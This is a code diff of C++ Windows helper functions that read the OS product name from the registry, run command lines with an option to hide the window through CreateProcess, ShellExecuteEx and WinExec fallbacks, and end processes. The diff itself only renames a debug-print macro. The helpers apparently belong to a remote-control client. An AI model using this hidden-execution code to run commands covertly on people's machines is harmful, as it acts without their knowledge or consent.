@@ -55,7 +55,7 @@ std::string strOS() {
 	HKEY hKey;
 	auto ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_QUERY_VALUE, &hKey);
 	if (ret != ERROR_SUCCESS) {
-		DebugPrint("RegOpenKeyEx ERR");
+		__DBG_("RegOpenKeyEx ERR");
 		return strOut;
 	}
 	DWORD dLen = 50;
@@ -63,7 +63,7 @@ std::string strOS() {
 	if (RegQueryValueEx(hKey, "ProductName", nullptr, nullptr, (LPBYTE)&lBuffer, &dLen) == ERROR_SUCCESS) {
 		strOut.append((const char*)lBuffer);
 	}else {
-		DebugPrint("Unable to retrieve product name");
+		__DBG_("Unable to retrieve product name");
 		strOut = "Windows :v";
 	}
 	RegCloseKey(hKey);
@@ -149,7 +149,7 @@ u64 GetFileSize(c_char* cPath) {
 
 bool Execute(const char *cCmdLine, int iOpt){
 	if(iOpt == 0){
-		DebugPrint("[EXEC] Oculto");
+		__DBG_("[EXEC] Oculto");
 	}
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
@@ -166,7 +166,7 @@ bool Execute(const char *cCmdLine, int iOpt){
 	if(iRet != 0){
 		return true;
 	} else {
-		DebugPrint("CreateProcess error");
+		__DBG_("CreateProcess error");
 	}
 	SHELLEXECUTEINFO sei;
 	sei.cbSize = sizeof(SHELLEXECUTEINFO);
@@ -181,18 +181,12 @@ bool Execute(const char *cCmdLine, int iOpt){
 	if(ShellExecuteEx(&sei) > 32){
 		return true;
 	} else {
-		DebugPrint("ShellExecuteEx error");
+		__DBG_("ShellExecuteEx error");
 	}
 	if(WinExec(cCmdLine, iOpt == 1 ? SW_SHOW : SW_HIDE) > 31){
 		return true;
 	}
 	return false;
-}
-
-void DebugPrint(const std::string strMsg, int iValor) {
-#ifdef ___DEBUG_
-	std::cout << strMsg <<' '<<iValor<<'\n';
-#endif
 }
 
 bool EndProcess(int iPID) {
